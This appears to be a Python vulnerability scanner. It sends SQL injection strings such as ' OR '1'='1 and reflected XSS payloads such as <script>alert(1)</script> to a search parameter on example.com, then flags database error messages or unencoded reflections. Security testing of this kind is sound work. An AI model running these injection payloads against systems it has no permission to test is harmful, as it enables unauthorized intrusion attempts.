import requests

# Target URL and parameters to test (customize as needed)
target_url = "http://example.com/search"
test_param = "q"  # Parameter to test for vulnerabilities

# Payloads for testing SQL Injection and XSS
sql_payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "';--", "' OR 1=1--"]
xss_payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>"]

# Keywords to look for in response indicating SQL error or XSS reflection
sql_error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

def is_vulnerable_sql(response_text):
    for error in sql_error_signatures:
        if error.lower() in response_text.lower():
            return True
    return False

def is_vulnerable_xss(response_text, payload):
    # Basic reflection check: payload appears in response body unencoded
    return payload in response_text

def test_sql_injection():
    print("Testing SQL Injection vulnerabilities...")
    vulnerable = False
    for payload in sql_payloads:
        params = {test_param: payload}
        try:
            response = requests.get(target_url, params=params, timeout=5)
            if is_vulnerable_sql(response.text):
                print(f"Possible SQL Injection vulnerability detected with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")
    if not vulnerable:
        print("No SQL Injection vulnerabilities detected.")

def test_xss():
    print("\nTesting Cross-Site Scripting (XSS) vulnerabilities...")
    vulnerable = False
    for payload in xss_payloads:
        params = {test_param: payload}
        try:
            response = requests.get(target_url, params=params, timeout=5)
            if is_vulnerable_xss(response.text, payload):
                print(f"Possible XSS vulnerability detected with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")
    if not vulnerable:
        print("No XSS vulnerabilities detected.")

def main():
    print(f"Starting vulnerability scan on {target_url} for parameter '{test_param}'\n")
    test_sql_injection()
    test_xss()
    print("\nScan complete.")

if __name__ == "__main__":
    main()
